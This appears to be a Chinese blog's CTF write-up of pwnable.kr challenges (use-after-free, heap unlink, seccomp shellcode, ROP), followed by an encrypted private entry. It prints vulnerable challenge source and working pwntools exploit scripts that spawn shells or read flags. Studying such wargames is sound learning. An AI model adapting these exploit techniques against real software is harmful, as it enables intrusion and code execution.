* 10 k += 1 else: break start = 0 end = number middle = int((start+end) / 2) for p in range(chance): weight=getweight(start, middle) if (middle - start) * 10 == weight: start = middle middle = int((middle + end) / 2) else: end = middle middle = int((start + middle) / 2) if (middle == start): print(end)client.send(bytes(str(start) + "\n"))s = client.recv(1024)print(s)#就是在这里昨天多加了一个enter，从而导致后面接收的数据有误(得加红加粗纪念一下）#client.send(bytes("\n", encoding="utf-8"))（垃圾代码毁我青春）s2=client.recv(1024)print(s2) blackjack思路：额，这题不想说啥，800多行代码其实就一小部分有用，就是考耐心与阅读速度，根据提示下赌注，成为百万富翁，然后就有flag了。 lotto思路：这题和上题一样也是脑洞一点的题，需要一点知识储备，就是ascii码表33号以后才为可见字符，范围大大缩小，等于在33~45的字符里随便选一个有 6/(45-33) 的概率获得flag。试几次就有了。。 cmd1思路：使参数通过滤器，利用字符串补齐功能即可。 cmd2思路：分析源代码可知是加强的过滤，需要你去了解环境变量PATH的作用和意义，extern 从外界导入变量，并且用一个函数将环境变量清空，代表所有的命令都必须是绝对路径。不能用‘/’是最操蛋的事，所以必须在根目录里用$(pwd)来显示‘ /‘，$(命令)的意义是将命令在sh里输入时的输出结果原封不动的换在$()的位置。 uaf思路： 1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0; &#125; 从这题开始就有点难度了，开始向读者介绍一些基本的pwn的方法，并且需要学很多新的知识，有知识才能解题，经过一番查阅后得知UAF为use after free/delete，即先malloc()一段空间后，free/delete后指向其的指针却没有NULL，从而继续申请一块大小相似的malloc()后（数据精心设计），这个指针将指向他，可以通过操纵这个指针来操纵这块被设计的数据空间，进而pwn。 大致思路分三步：一是先找到原来MAN申请的内存大小，作为第二个参数，二是找到虚函数表的地址，在ida里就可以解决，三是创建一个文件将修改的数据放进去(我创建文件创建不了，不知道为啥，只能从标准输入输入了)。 exp：（看别人的exp学到一个新技能，/dev/stdin） 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='uaf',port=2222,password='guest')p=s.process(executable='./uaf',argv=['./uaf','24','/dev/stdin'])p.recv(1024)p.sendline('3')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('1')p.interactive() memcpy思路： 1. 有源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 很明显要先学习知识：需要学习setvbuf()，mmap()函数，和c语言内嵌汇编的形式，以及movdqa，movntps命令是干啥的，也就是必须要理解以下这段代码是什么意思，在此分享一篇相当详细的文章 链接 1234567891011while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); 其实这题实际上想考的是堆分配时字节对齐问题。只要保证每次输入的数在他要求的范围内并且顺利运行完程序即可，问题在于movntps和movdqa要求操作的内存地址必须为16字节对齐的，所以dest必须为0x——0，可以在代码中加上一句 printf (&quot;dest: %d\n&quot;, dest) 再运行就观察起来方便很多，每次dest比上次增加的数就是上一次的size+8，自己找规律即可。 asm思路： 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 正如开头所说，第一部分为了帮我们搭一个框架，所以各方面都稍微涉及到，这题的目的是让我们对shellcode有一定的了解，分析代码，发现需要学的东西有沙箱中的seccomp() 参考1 参考2 然后他限制我们只能用open read write exit等 所以基本思路就是用read读flag中的内容，然后用write向标准输出写。然后写exp时需要用shellcraft生成调用函数的汇编代码再用反汇编生成shellcode。学会了一些写exp的新知识。 exp： 1234567891011from pwn import * s=ssh(host='pwnable.kr',user='asm',password='guest',port=2222)p=s.connect_remote('0',9026)context(arch='amd64',os='linux') shellcode=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_ file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooo oooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooo oooooo000000000000o0o0o0o0o0o0ong')shellcode+=shellcraft.open('rsp',0)shellcode+=shellcraft.read('rax','rsp',1000)shellcode+=shellcraft.write(1,'rsp',1000) p.sendline(asm(shellcode))p.interactive() unlink思路: 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 这一题算是最基础的模仿unlink的堆的题目，设计的很巧妙，简洁易懂这和初学者入手，先查阅资料得知unlink的基本原理(我看的范例是double free)，理解unlink()函数的意图是解题关键，即B-&gt;fd-&gt;bk=B-&gt;bk， B-&gt;bk-&gt;fd=B-&gt;fd 等价为*(*B+4)=*(B+4) **(B+4)= *B 改写B中fd和bk的值理论上可以向任何地址写入任何数据。 开始解题： exp： 注意：recv()接收数据以字符串的形式，例：0x456789占8个字节。print一下即可知道接收了几个字节。 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)p=s.process('./unlink')sh_addr=0x080484ebp.recvuntil('here is stack address leak: ')stack_addr=p.recv(10)stack_addr=int(stack_addr,16)p.recvuntil('here is heap address leak: ')heap_addr=p.recv(10)heap_addr=int(heap_addr,16)payload=p32(sh_addr) + 'A' * 12 + p32(heap_addr+12) +p32(stack_addr+16)p.send(payload)p.interactive() blukathorcruxes思路：1. 没有源码，只能远程下载（scp -P 2222 horcruxes@pwnable.kr:~/horcruxes Desktop）在放进ida里分析。 题目提示为rop则肯定是利用栈溢出来pwn，所以找gets()成为第一步，发现在ropme()函数里有gets()，所以思路基本确定为改写ropme()的ret，分别打印出ABCDEFG的值，然后算出sum，之后再跳到ropme()函数再执行一次拿到flag。(难点在于写exp…….) 大致步骤为：1.先用ida找到七个函数的地址，记录下来之后 2.看偏移确定payload (操蛋的是sum的范围不能超过int，必须用一个if else结构选择一下) exp1： 12345678910111213141516171819202122232425262728293031from pwn import * s=ssh(host='pwnable.kr',user='horcruxes',password='guest',port=2222)p=s.connect_remote('localhost',9032)horcruxes=[0x0809fe4b,0x0809fe6a,0x0809fe89,0x0809fea8,0x0809fec7,0x0809fee6,0x0809ff05] ropme_addr=0x0809fff9sum=0p.sendlineafter("Select Menu:",'0')p.recvuntil("How many EXP did you earned? : ")payload='a'*0x78for i in range(7): payload+=p32(horcruxes[i])payload+=p32(ropme_addr)p.sendline(payload) for i in range(7): p.recvuntil("EXP +") tmp=p.recvuntil(")",drop=True) log.info(tmp) sum+=int(tmp,10)log.info("raw sum: 0x%x" % sum)if sum&gt;pow(2,31): log.warn('try again') exit(0)elif sum&lt;-pow(2,31): log.warn('try again') exit(0)p.sendlineafter("Select Menu:",'0')p.sendlineafter("How many EXP did you earned? : ",unicode(sum))p.interactive() exp2: 1234567891011121314151617181920212223242526272829303132333435from pwn import *from ctypes import *s=ssh(port=2222,host='pwnable.kr',user='horcruxes',password='guest')HOST = "localhost"PORT = 9032r = s.remote(HOST, PORT)horcruxes = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]main_call_ropme = 0x0809fffc def main () : exp = 0 r.recvuntil("Menu:") r.sendline('1') r.recvuntil(" : ") payload = "A"*116 payload += "B"*4 # SFP for i in range (7) : payload += p32(horcruxes[i]) payload += p32(main_call_ropme) r.sendline(payload) for i in range (7) : r.recvuntil("+") tmp = r.recvuntil(")").replace(")","") log.info(tmp) exp += int(tmp) log.info("exp : " + str(c_int(exp).value)) r.recvuntil("Menu:") r.sendline("1") r.recvuntil(" : ") r.sendline(str(c_int(exp).value)) r.interactive() if __name__ == '__main__' : main() pwnable.kr第一部分到此结束，（以前有一题codemap好像挺不错的，有空可以找来看一下。）也算对这一个多月时间的交代吧，进度已经慢太多，也有不少细节问题没弄懂。。。下一部分计划是跟着ctf-wiki把栈溢出学完，然后去jarvis.oj把栈溢出的七道题做了，然后在跟着ctf-wiki体系学习。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂物1]]></title>
    <url>%2F2018%2F12%2F20%2F%E6%9D%82%E7%89%A91%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 631363d8e0a1f3d6313255c2e1c4223c19c4e0337bbd5a4b33ba240842c36aa98731ced6ea3f9579f86a552a2642c7739700a915d941e17302141b9c56e182f5a3156503f31b85d2f06f5692bb289bf124559d4374f944f9287c6e0e91eec1e9c00732421e14049fa6c80a47692e712679f7df091458f3be75615cc3ccca99261ef5e14709f8dc04f9a1a4ec17e62cac7fdae420c45015cf9a9d9b618881fc02c3f4f113b433a7783d91406b35c8b6d82b0d12ddcb2fd57bfa4a6eccdb55c5f9d78ae791c9072f0f3ef162a55b76fb6455b7b7c7486b8bb59489392a6766411ea44d7a0465792ec54d9f0a7f4a09661c6e00731ea3b0a1e9572f0b60d92bd749ed8854654bfc09c5035116e330b210fea89e75c9b3a158f5f82c455183dbf78838cbd273f86db820ed09e3e556ccaac91159753e9aedfdb9bee3cea4ab2b3b790c103b0ae2c5fd7d393c3d274fd8e52c87a1d784fa419d64c90b22f76911fa79e12b63ced10a9ed9926801e3ef0df5b14a63813283ca7a3c2fc878f13f57a31af3317d316cc8b826cf3b9e19b8665e7bcaea723aa656e247fd08cccca4d16d982fec16882dd0ab98ddba32d82cc5bd2a48731e0624b4ae95afb455c0196b35a4f56a8181b7c649ab0c3d665b564f0fb3eb3e528d9db584000f883e06c86727cf4c63a363f3e71145dd048fd586659d593710a2b713cfc7071d480706b00a2edd3d28dbea15d5d2c8e120ec1e7014babebd33dcf265a6a758fa58c2bda9a533e0d3c31c6f38d4b93be18beef91766a946382228d4985f2e7dbf53b213b15e03d82dcd5e41424bfa0b49bfeff552db12cfe4586c5b50bb3bab4dd4d5cc29e1d9e2dddf061de7e8d9a0cc46a95f49a7306e2e309a42ba8e5ef73cdca7c0b7cbd5a278c25844743c63c21d94311dd01c920dd0602b5c14fe786d2492068a22f10f765b6239b34db530c7108e8fb868c8c3896a6b5375b737fa206e7966bed2ea4e7f8d24a4a61ee755ce5e818d308ead3ea8bbbb0c67dcd6688890667a48e04a21a3c77ed7a8a9dd9a0582e6baae59cc220a20197ad10d567a4344136c76bca0cd6c71f9973164082072188bdc5cc58f9e4fe89883b8f618d8bdac70ca1c83a173db4ef436c768d800901698c94cecfc3b654a03e4608a332dcab65bc20099fe6642c35af6b8f8684ebfd0fa28630d30934a597a7365c610328eb2a6e329ecee3bffb6d78c7a9d365d4d76b65c18dc7314dd77e6a03829a6b6f1b2709a50a91e0eaca4790df9d942e0071c0822d3a6dcda24fd0821135c124ac72b9fd1653b61877cfeefc174ab24ac3228ab8f0eed298b608aa89c2078245ba8208789f9a0e9fb523af4f3338dcdd79d2a63af06a8c2a9a9dc1e66fe41a425a5bdd796b20cc683ce93fabf7e65493955f6e87aa0680a321825e9c99958a53852300a8d3c3e48a729078b79305c5e5b544015c7f4beb0a584f4d2bf5d90a183ac2d6703dea79a395b5cbd8d6a2516924fad708543e6d5f9795dbd7f291c34bcc9053c4867740e07d6f4ebf4b209223b9163627f43a3e94e385a59b7f02d6ca75cba9ae68f5eb59930bd6077d00bb11853a5dd2c73b839a3d770b0a03454a8a23fe057b07af60400538a6d870c61834f792afc5ddcc9bc22562de659bc69c6326e95e71da5b9386c62060573583cacb112bb927d1845dda835ef43f8f1cd567bcc6e4553adc987e27498214ab051b64f65c88d90e799874c4ddc0b80df6ef1bf2ccaca4967d1b23fc1aec298d39375b4bf6cfac159fad3706fca0fb03c53f85f61583b9960c0cfc2f20fc12eaf77094d6887ab72f389313ef9ec71425e2bfaedb94215b14cd8026f9aa3a6300c0e91ee64aa4d4e8009c5b92254782caeec5ee01420cf5c5972993550e954509cab42223b195f0e6f35fce239d3be550fae9d5139dc85ea16b63f7df6f65aade21a5a88d0a49f26afaa20d94ecb8d27954a151264faa82dfe28f95d7ed0e893ba7f71a332359bb03ffd63981d00eed0c116a5714561c4d84fb1ed3121e14fa90ff4a6330ebb0553eb1c4a311967e9e70c9fa518458042d642383c0e582336362049e52d590c9c5e1ba285c6024b0665f1a25d4109d3d910b462e5f0f3100458e05fe94c1bff1ac32e193f871589dd768f3bb5a99969075dab4d5b0b06ae4b92b0e24e5bacf3d968d770b51e13e8bbd27e8c4544b2e6713952ce56c1ad99c0dd63e6013fe4caa54e364e1bc5e1e2b530e6136a319696b450ec893cdb9b3f255845fd096be70c5d2877abc62ba34f6e3004f281ae10b4ecc6227513c768c7ba7625b79ba87134f6877dcb7c5a997174f828d8d4d2923263e1c5a82f2883c3f92feab1e6ff573c346a9e3812d67c2c8a81e4fb3d6faa59cd4d3f5fbe76649b2ffd0445683b76a09b8e89e2c96f3fab012d560e1efd6f4bbd5ba0f876c3377d398cdf5b0a824daa05b446faaa7c54efdc18fa929f3ae5df76b40be52b4933d00afbaebb783a5a1de02796da8d3c1b8e6e112904d60d97082afed1d6642a15410574e52e242953fb6c2237097b740bca75952f71b9b47ef14e065384987f219a049c7d3a43b6b4cb23c4557813c3ef08e100687a4606c994533c59f498eee373bb16f748508d29c37fd280e40291287abe9d720b62af07ded60a07b075a7f7d954de4d55b2a64f38d3534004c2a4641020a68694e342aa72367a34c5783ce4370efd34cceee9ab38bf03ef4e556c3c8d6fdf937b65c7fe3c10143ad9d9a256daf5bcbb7af6d3a9f92553bdeb33a6de8940ab21a4f1c9e2c0ca2ae33c243f78465e45d6d4e3b4593ed91faef80f0e54756df313e5e06e83c64eb5b93508ed1b15a7615ab78b6c624b06c6da91685845a658061607cce811a00ee07c17ff6ea7e79ba50dd54445b76aeb3e5777a8efa759762ccce76e700a54753044c925b4b1b7380232cef1091429b2bd082040e2d72e117aae9fa30ec8d27afdc4c41c3c798491f1eb8f14497762993760d12863bb44b8f240b98a9f8ec70ff5c38a749eda36c2e35ade850a977e5b543cabfb2858fe37b4334a2dd7f268daaa5f545f5210b1f99797d7fe620df394228fc914175a25ccdfed17c8474e0d1fe59c4027fd518f49215e81a92489ac706db3bdaa5b68b229765585eb1ffffb0a4694b2308aa32c3022a218f46aa9df0fd370c2b009750a1333b435b85263d7f937a8ba5578f969fb2ab1f8167dbaa83ee3abbe88bb71a93643147a33d66fe1ea3cb53251671f6668c9767d0859fa24c11ae3ce49870ffcf2e61dee3dfe264947104ee2db432e239e8d60a690ea71e16407c950139962e6d0b594d0a8eabb02f0c54d20c3b305bfe85c60d14b27a9786895947a5648c04f3cdb48ca3d1f7e65e13389a5557e509b68164ee2a2f45157b56921fed6bc66b8cf8ebdd1cc17c6656d903c05329d14267a93e20e8741c7615ff351b20b18b4d287cb316f611f2e48afdf2ff4bc01f69f75071bc46989aae6931ad8cdcac716b15c33b284e54e1b808bdc74764b3dc6ccdacc7d3f4b931537577fe05ad5ed5fd2fd0e8ef88d9f7fce03dac70b613360f6a08edb0331bca51bb034d1b358fa69aa90a153d2b8e77314db446fd491e73c31abe257a0a7a5a10b20c52867ee42b9f1853ecd3da62d593b271a8737ec2cdd0a9383c05b6adbe8e5d398f89bd20b96f45434cc70297ee7761162a73a836b7ac12ef234d0857b9b269babefe6245743b4e1918a294e353ed668c8a4313510544bef1883dd5eb60a5e06f5c27e94672993c09ddfa4a4d45d2aa8991a3724c968e65a171fed9b79afed1480335fe967cc44a697337af5f98c837170b687fef12bcb356e93ad80273ee25231367b5dbb78b139fbe4bd1f8bb9f345ec561d19f47b32408e1c1c8a05decabeada198adb281a21da1ed553bb5b7dd16896adfefb12adc939f54f6bea32a8eace71acc7c4f8ebc4e46dd861a588c75b1c49511a81dee50ec82f14ac8271128e274fb05e1243c9f0bf9bd529e5c4cf92d59e1649e12289a34b1748b921a90c747048874dc29486fb6aa1261d759dbb7cedc6c0170158f0e4c052bb5f89b3955ccaba30afd3abc8ad841336b8cf7cf25b05979d43a66c6eb4c4285364087fba5c6ba2086181622e1835bdaea4737bb6b0d8d6d4bf2c8311bc977fbae0cbed3044780d565d3dd6d8909dc3fff397a921686ba7963ae95e9d64e8121e171e80bb7e7357c6320cc413ea5c0a531bc4cb9c20e89f55df81589b998d7d9eb81b8e81910943357d6b6d7f82c56cf291a4709366a36a8181de4547e095a9750213b00ccd3a68a73c6eada29e24281f19e084d0ed882e3ffadc2182a3f0a9bd00762cb2b6d83dd7c4b14ac9e531a3ea806918dc919eb875c4159289564e4c4d0e4c0ca32786033af441bd024f692f5075c1869b5677b09aa27b3bf2708b0cef8d93f591c189ef46ca29ec417ca604186dc14ad38a4e5bbb1a2ccc8890ffdc6adc78317b3d8979e907f134eef7345e46c65b9acf3397d812660b851be9cac7a2bed2a12f6e0039560fd6fb39c3de0baa95a10ee4efd4382c36d590ddd01c24401b5d6be18ac3537de38223afb12222a64cbb538b87db0ffb389c79f7b6f8599edff74d35237e6fb07a482bcb3430459c1c17382a1dd23d934ed6e22aac9f2a0084d89a1d6e72d7041758d8396f5946bcc30df5ca5bdf36ce942410886b8308f59e1b52b848bdf37a0c5d42673cd1efbde6de712a100da9fa0aba9a2f8b7ac83ce95f46e2481e03f4a34b675dc676d1d0dec174f0d95b357bd2ef8f69228e7fee9b459de703e1dd319d56207c824ecba0001b786d7845fa255afea2e0eccced1dd6ef1cf66d7bc573bd4d024493eec964dfece3a7e9be74897251f24a028788565f00b4915701a57cc10c6fffad978379eecbcf23e220f7f1e7434b95ef0340e25ab61bb60e2b5aad2c6c359ae4400e06eeebabcfc5b2195412cfc09ac8468f588d37579f60d85ed526c09939f8628c5a4f6be1f616ef341b00d00d77d1b837880d9cd3252b72a059af0a69816fdd552c2d641b484246d0fa00c6feff8279f0e0859a987fe1145b2a09ad49c27d9d3532c24aec7f917c071ed26ddc2027d79215c7479ed60089716f311906c12005164ace3c87dfad8c4d23b4133041871150bfdc7146d9cd12ad4a5946872be683db7e5fc96b254e671e59dd038e468c843620de51d8586e52681116d5202bc44743444fe747c2e566f3b9b9d6098f6f82311e030599a25e6b7b5484e047355cb36b1d02002bf07ec88a3092dd580ff5d3d46328322e603e187e795dc7292787793ecf7d9b9f349740fd7a46c397acc179acd644ba456288aa511a6cfa876d5c5ffbd074d4ae3eeea0b9be63865163aa41560b226f8373759dd4ea6e7e26841c477533cf657d8a5f46047f551b0e487f8bbf8152aabcff3218836ef0312bb299808cbcbc2083210d49a3aaf2eca1e4cdde55724c31c03e443bd937a19252f153ea306beeffb319088dbd1232b37d634048bf37492b36efa096da0668e4dfc082109eaa2f7fc900ff537db0fdf70eddc672eca39352c182eefa571ddc60197430cced5af8b2632274b12a2ea832bf0c671c8c44cdfff72f932d356c4350b7762a3bdaa8fc205f7bed3a6acbc954b89a0ca1142ff8e4760456640ff3d2e481e0f107df2ba235f6c9cb2b3692178bc068f9bea05956a7e6adbd49ac7f38d79b985cdfcf2cf03ffc9fd5149d15e281bfbe0503686b989b35bd86683f5313dc6a0f992686089766293b73589b245767a4cfd2ffc96b7d4956ddc9ca29f98e9fb7e28e6b4b9aa9480bfc13c638411289dcabc4487c1545bfde6ff1966b567cce6f2942a528eabc07ef2649c78fe75fad4ae5a727c6ee8f1ca18ab12d5a8654ebcd9cb2abca88c5e5a2ea888cff62382274f0d69c077f5b2b55a4ab51030ae4240f1a2cbfa1fd6bcb2631a48fa1ca78b692caede107f6eee1700f8404cf0da17666baf202ac21a9034b4fc22247f3256dd7b5c98d07ce9ed031e098f3135f1fdee63778c51d907e5644edeb6fa7306958dbabe245b0c11bee1992121c8d9930547fa9c148dff9b088117bafa07f3881808f833e9be29294ce8807605ce08d1ad1df7b483c0e75edd8c295b2c2faa38bc4a0d6bc66ad63f667ab68aa86ee1f321bcbb0a6aac3b960e6fad9f741ec242c53800c3a0184e7e8b768e8ec414c2bf9811dfae8238c02d02328e3bb48ee98dc7ee66daae4460c09c60df6422e1e9661dbc0cb03d5b8aba5d50470cfb2c7b23c9eb6133fbc45149c33b3166d7ef95e830a10ed4d58831f13d5127a2318219efc6bd735fb51ca80d5ea51d4f9f3e291cc8f9c7d3491358f35c7c0892cbf46025b034f60abb590167af17d69ff5eff1e4a8c722f89885d40c5670d8213bae6bbb971ccf910f6f1087419450fd1d648736ae465773f24624abf2026ced63e5e34aa856382880e4e5dda9a65455f4a3f2657710828ecdc43e7550b3c92b8805fc6ba69e5efdfc8d948314949427a5f4ecac540313e2ccf4f4815d14c81b1e8e82b373230192b099574c4dc813abe5c66adfb875a6d195e265ad7c8874d050a45fc9714dd33174367673e134cfd5e51f5487666247a8a51d3c115204a34b8f0c1e0dfc7cdcefcec6bc226f174a7d1bb0402045a0d449ad242d2cdca1c971185817083c888816aa0f3dbc7ef403603dc5f64691ba3d7d5682c34c249372e3fa20093f569e642677f5aefabbb57968d89790b87138c9d9958c783756c81c984ad9a6dc0e509a036a7687055e1627f831310bcfc97804ff677438e9376dcae09aab5cdebabb570b8106d719143221dc85f75b1ee34b5ea6d5df0fa7380f12ecaf8a69ce693e94a0f4a293998b2eefa722e27fd8945073249efce38fa967072b347ba2a414bb89d31679f0e3b7a0a66b2f44787f78ca4d5e4589c634aa20fbec0774ba2086e654bd6f1185ad2251119d706bd857a8c0a07837177252e439a984eb18f719bb4d46f99d1c119d0a6079f2f437e8dd71ea2a0161bde0871928504c61fab3a2da25e5bd52dd50c5ce7f9f7b041112f3c009f1655ae0ed7ee2a6079384cf83623ea9a5956b4559e728f37fbd0db8e667352c13631fdb498e845ead3ea60b4311230df35437cc3bbb9152d3c3d2f13cdc8f11179e1c52e16642372bfb329aa1f57570c9979323621e15ebd53afdb8274de7913343f5d179f264a09d9b3698de0a9f7ef8df1b76727099bfbcadccf940241b31725597613a8061a0b656440d76215fdf041a0d10cb348a7847fb6958425aad191c218025f5834400b97ec1b539baf822880ae